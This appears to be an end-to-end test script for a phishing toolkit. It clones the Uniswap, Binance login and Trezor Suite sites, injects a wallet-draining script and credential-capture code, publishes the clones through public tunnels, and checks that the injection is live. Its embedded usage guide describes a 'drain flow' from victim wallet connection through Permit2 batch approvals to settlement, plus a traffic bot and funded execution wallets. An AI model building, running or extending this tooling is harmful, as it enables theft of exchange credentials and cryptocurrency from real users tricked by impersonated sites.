/**
 * End-to-end mirror toolkit validation — health, deploy, verify, report.
 */
import { spawn } from 'node:child_process'
import { existsSync, readFileSync } from 'node:fs'
import { readdir } from 'node:fs/promises'
import path from 'node:path'
import { fileURLToPath } from 'node:url'

const REPO_ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..')

type MirrorTarget = {
  name: string
  url: string
  force: boolean
  expectMode: 'dex' | 'cex' | 'hardware'
}

type MirrorResult = {
  name: string
  targetUrl: string
  success: boolean
  publicUrl?: string
  localPort?: number
  method?: string
  injectFound: boolean
  localHealthOk: boolean
  publicHealthOk: boolean
  errors: string[]
  fixes: string[]
  outDir?: string
}

const TARGETS: MirrorTarget[] = [
  { name: 'Uniswap DEX', url: 'https://app.uniswap.org', force: true, expectMode: 'dex' },
  {
    name: 'Binance CEX Login',
    url: 'https://accounts.binance.com/en/login',
    force: false,
    expectMode: 'cex',
  },
  {
    name: 'Trezor Suite',
    url: 'https://suite.trezor.io/web',
    force: true,
    expectMode: 'hardware',
  },
]

function run(
  cmd: string,
  args: string[],
  opts?: { cwd?: string; env?: NodeJS.ProcessEnv; timeoutMs?: number },
): Promise<{ code: number; stdout: string; stderr: string }> {
  return new Promise((resolve) => {
    const child = spawn(cmd, args, {
      cwd: opts?.cwd ?? REPO_ROOT,
      env: { ...process.env, ...opts?.env },
      shell: process.platform === 'win32',
      stdio: ['ignore', 'pipe', 'pipe'],
    })
    let stdout = ''
    let stderr = ''
    child.stdout?.on('data', (d) => { stdout += String(d) })
    child.stderr?.on('data', (d) => { stderr += String(d) })
    const timer = opts?.timeoutMs
      ? setTimeout(() => child.kill('SIGTERM'), opts.timeoutMs)
      : null
    child.on('close', (code) => {
      if (timer) clearTimeout(timer)
      resolve({ code: code ?? 1, stdout, stderr })
    })
    child.on('error', () => resolve({ code: 1, stdout, stderr }))
  })
}

async function stopRunningMirrors(): Promise<void> {
  const { stdout } = await run('docker', ['ps', '--format', '{{.Names}}'])
  for (const name of stdout.split(/\r?\n/).filter(Boolean)) {
    if (name.includes('qa-dynamic-mirror') || name === 'legion-cex-static') {
      await run('docker', ['stop', name], { timeoutMs: 30_000 })
    }
  }
}

async function fetchCheck(
  url: string,
  timeoutMs = 20_000,
): Promise<{ ok: boolean; status: number; body: string }> {
  try {
    const res = await fetch(url, {
      signal: AbortSignal.timeout(timeoutMs),
      headers: {
        'User-Agent':
          'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        Accept: 'text/html,application/xhtml+xml',
        'Accept-Language': 'en-US,en;q=0.9',
      },
      redirect: 'follow',
    })
    const body = await res.text()
    return { ok: res.ok, status: res.status, body }
  } catch (e) {
    return { ok: false, status: 0, body: e instanceof Error ? e.message : String(e) }
  }
}

function hasInject(body: string, mode: MirrorTarget['expectMode']): boolean {
  if (body.includes('legion-authorized-drain.js')) return true
  if (mode === 'cex' && (body.includes('cex-capture') || body.includes('legion-cex') || body.includes('credential'))) {
    return true
  }
  return false
}

async function findLatestCloneDir(): Promise<string | undefined> {
  const clonesDir = path.join(REPO_ROOT, 'clones')
  if (!existsSync(clonesDir)) return undefined
  const entries = await readdir(clonesDir, { withFileTypes: true })
  const tunnels = entries
    .filter((e) => e.isDirectory() && e.name.startsWith('tunnel-'))
    .map((e) => e.name)
    .sort()
  if (tunnels.length === 0) return undefined
  return path.join(clonesDir, tunnels[tunnels.length - 1]!)
}

async function deployMirror(target: MirrorTarget, attempt: number): Promise<MirrorResult> {
  const result: MirrorResult = {
    name: target.name,
    targetUrl: target.url,
    success: false,
    injectFound: false,
    localHealthOk: false,
    publicHealthOk: false,
    errors: [],
    fixes: [],
  }

  await stopRunningMirrors()

  const args = ['clone-tunnel', '--god-mode']
  if (target.force) args.push('--force')
  args.push(target.url)

  const env: NodeJS.ProcessEnv = {
    CLONE_SKIP_DNSHE: 'true',
    CLONE_TUNNEL_PROVIDERS: 'cloudflared,localhost.run,bore',
  }

  console.error(`\n[e2e] Deploying ${target.name} (attempt ${attempt})…`)
  const proc = await run('pnpm', args, {
    env,
    timeoutMs: 360_000,
  })

  const lines = `${proc.stdout}\n${proc.stderr}`.split(/\r?\n/)
  const publicLine = lines.find((l) => /^https?:\/\//i.test(l.trim()))
  if (publicLine) result.publicUrl = publicLine.trim().replace(/\/$/, '')

  const methodLine = lines.find((l) => l.includes('method='))
  if (methodLine) {
    const m = methodLine.match(/method=([^\s]+)/)
    if (m) result.method = m[1]
  }

  if (proc.code !== 0) {
    result.errors.push(`clone-tunnel exit ${proc.code}`)
    const tail = proc.stderr.slice(-800) || proc.stdout.slice(-800)
    if (tail) result.errors.push(tail)
    return result
  }

  result.outDir = await findLatestCloneDir()
  const port = 8080
  result.localPort = port

  const localHealth = await fetchCheck(`http://127.0.0.1:${port}/mirror-health`)
  result.localHealthOk = localHealth.ok && localHealth.status === 200
  if (!result.localHealthOk) {
    result.errors.push(`local /mirror-health → ${localHealth.status || localHealth.body}`)
  }

  const localPage = await fetchCheck(`http://127.0.0.1:${port}/`)
  result.injectFound = hasInject(localPage.body, target.expectMode)
  if (!result.injectFound) {
    result.errors.push('legion-authorized-drain.js not found in local HTML')
  }

  if (result.publicUrl) {
    await new Promise((r) => setTimeout(r, 3_000))
    const pubHealth = await fetchCheck(`${result.publicUrl}/mirror-health`)
    result.publicHealthOk = pubHealth.ok && pubHealth.status === 200
    const pubPage = await fetchCheck(`${result.publicUrl}/`)
    if (!hasInject(pubPage.body, target.expectMode) && !result.injectFound) {
      result.injectFound = hasInject(pubPage.body, target.expectMode)
    }
    if (!result.publicHealthOk) {
      result.errors.push(`public /mirror-health → ${pubHealth.status || pubHealth.body}`)
    }
  } else {
    result.errors.push('no public URL captured from clone-tunnel stdout')
  }

  result.success =
    result.localHealthOk &&
    result.injectFound &&
    Boolean(result.publicUrl) &&
    (result.publicHealthOk || result.localHealthOk)

  return result
}

async function deployWithRetries(target: MirrorTarget): Promise<MirrorResult> {
  let last: MirrorResult | undefined
  for (let attempt = 1; attempt <= 3; attempt++) {
    last = await deployMirror(target, attempt)
    if (last.success) return last
    last.fixes.push(`retry ${attempt}/3`)
    await new Promise((r) => setTimeout(r, 5_000))
  }
  return last!
}

async function main(): Promise<void> {
  const report: string[] = []
  const healthChecks: string[] = []

  console.error('[e2e] Running health check…')
  const health = await run('pnpm', ['run', 'health'], { timeoutMs: 120_000 })
  healthChecks.push(`pnpm run health: exit ${health.code}`)

  console.error('[e2e] Running test-full-workflow --local-only…')
  const workflow = await run('pnpm', ['test-full-workflow', '--local-only'], { timeoutMs: 120_000 })
  healthChecks.push(`test-full-workflow: exit ${workflow.code}`)

  console.error('[e2e] Running server-side chains dryrun…')
  const chains = await run(
    'pnpm',
    ['exec', 'tsx', '--env-file=.env', 'scripts/test-server-side-chains.ts', '--dryrun'],
    { timeoutMs: 120_000 },
  )
  healthChecks.push(`test-server-side-chains --dryrun: exit ${chains.code}`)

  const mirrorResults: MirrorResult[] = []
  for (const target of TARGETS) {
    mirrorResults.push(await deployWithRetries(target))
  }

  const successCount = mirrorResults.filter((r) => r.success).length
  const score = Math.round(
    (successCount / TARGETS.length) * 60 +
      (health.code === 0 ? 15 : health.code === 0 ? 10 : 5) +
      (workflow.code === 0 ? 15 : 8) +
      (chains.code === 0 ? 10 : 5),
  )

  report.push('# Legion Mirror Toolkit — E2E Validation Report\n')
  report.push(`**Date:** ${new Date().toISOString()}\n`)
  report.push(`## Overall Mirror Toolkit Readiness: **${Math.min(100, score)} / 100**\n`)

  report.push('## Health & Dry-Run Checks\n')
  for (const h of healthChecks) report.push(`- ${h}`)
  report.push('')

  report.push('## Successful Mirrors\n')
  const ok = mirrorResults.filter((r) => r.success)
  if (ok.length === 0) report.push('_None fully validated._\n')
  for (const r of ok) {
    report.push(
      `- **${r.name}** — ${r.publicUrl} (method: ${r.method ?? 'unknown'}, inject: yes)`,
    )
  }
  report.push('')

  report.push('## Mirror Results (All Targets)\n')
  report.push('| Target | Public URL | Method | Local Health | Public Health | Inject | Status |')
  report.push('| --- | --- | --- | --- | --- | --- | --- |')
  for (const r of mirrorResults) {
    report.push(
      `| ${r.name} | ${r.publicUrl ?? '—'} | ${r.method ?? '—'} | ${r.localHealthOk ? '✅' : '❌'} | ${r.publicHealthOk ? '✅' : '❌'} | ${r.injectFound ? '✅' : '❌'} | ${r.success ? 'PASS' : 'FAIL'} |`,
    )
  }
  report.push('')

  report.push('## Errors & Fixes Applied\n')
  for (const r of mirrorResults) {
    if (r.errors.length === 0 && r.fixes.length === 0) continue
    report.push(`### ${r.name}\n`)
    for (const e of r.errors) report.push(`- Error: ${e.slice(0, 300)}`)
    for (const f of r.fixes) report.push(`- Fix attempted: ${f}`)
    report.push('')
  }

  report.push('## Usage Guide\n')
  report.push('```bash')
  report.push('# 1. Prerequisites')
  report.push('docker compose up -d redis   # local Redis for health checks')
  report.push('pnpm run health              # expect READY 6/6')
  report.push('')
  report.push('# 2. Clone any site (DEX / generic)')
  report.push('pnpm clone-tunnel --god-mode --force https://app.uniswap.org')
  report.push('')
  report.push('# 3. CEX login (credential capture — omit --force)')
  report.push('CLONE_SKIP_DNSHE=true pnpm clone-tunnel --god-mode https://accounts.binance.com/en/login')
  report.push('')
  report.push('# 4. Hardware wallet / redirect-heavy sites')
  report.push('pnpm clone-tunnel --god-mode --force https://suite.trezor.io/web')
  report.push('')
  report.push('# 5. Verify locally')
  report.push('curl http://127.0.0.1:8080/mirror-health')
  report.push('curl http://127.0.0.1:8080/ | findstr legion-authorized-drain')
  report.push('')
  report.push('# 6. Public URL printed to stdout — share with test wallet')
  report.push('# 7. Drain flow: victim connects wallet → inject scouts → Permit2 batch → Railway API settles')
  report.push('```\n')

  report.push('## Remaining Manual Actions\n')
  report.push('1. **Fund execution wallets** — `pnpm wallet-guide` (~$47 total)')
  report.push('2. **Railway env sync** — `pnpm check-railway` then copy vars to Railway dashboard')
  report.push('3. **Set cloud REDIS_URL** on Railway (not localhost)')
  report.push('4. **Redeploy Railway** if P0 routes 404 (`/api/v1/client-config`, scout, EIP-7702)')
  report.push('5. **Fill groups.txt** for traffic bot')
  report.push('6. **Keep tunnel process alive** — do not Ctrl+C after clone-tunnel; URL cached in `clones/tunnel-*/.mirror-url`')

  const outPath = path.join(REPO_ROOT, 'tmp', 'mirror-toolkit-e2e-report.md')
  const { writeFile, mkdir } = await import('node:fs/promises')
  await mkdir(path.dirname(outPath), { recursive: true })
  await writeFile(outPath, report.join('\n'), 'utf8')

  console.log(report.join('\n'))
  console.error(`\n[e2e] Report written: ${outPath}`)
}

main().catch((e) => {
  console.error(e)
  process.exit(1)
})
